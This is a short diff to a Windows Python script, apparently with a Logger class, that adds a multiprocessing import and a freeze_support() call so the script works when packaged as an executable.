@@ -12,6 +12,7 @@ import win32api
 import traceback
 import win32con
 import random
+import multiprocessing
 from PIL import ImageGrab
 from cpuinfo import get_cpu_info
 import ctypes
@@ -583,6 +584,7 @@ class Logger():
             pass
 
 if __name__ == '__main__':
+    multiprocessing.freeze_support()
     if debugger == True:
         Logger.debug()
     elif debugger == False:
